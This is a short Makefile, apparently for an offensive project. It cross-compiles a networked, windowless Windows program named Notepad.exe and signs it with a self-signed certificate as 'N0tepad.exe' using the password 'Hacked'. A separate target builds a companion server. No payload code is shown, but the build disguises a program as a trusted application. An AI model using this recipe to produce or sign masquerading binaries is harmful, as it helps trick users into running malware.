exploit :
	i686-w64-mingw32-gcc -o Notepad.exe main.c -lwsock32 -lwininet -s -mwindows -static-libgcc -static-libstdc++ 
cert:
	openssl genpkey -algorithm RSA -out Private_Key.key
	openssl req -new -key Private_Key.key -out Request.csr 
	openssl x509 -req -in Request.csr -signkey Private_Key.key -out Certificate.crt
	openssl pkcs12 -export -out Certificate.pfx -inkey Private_Key.key -in Certificate.crt 		
	../osslsigncode/build/osslsigncode sign -pkcs12 Certificate.pfx -pass "Hacked" -in Notepad.exe -out N0tepad.exe 	

runserver :
	gcc server.c -o Server
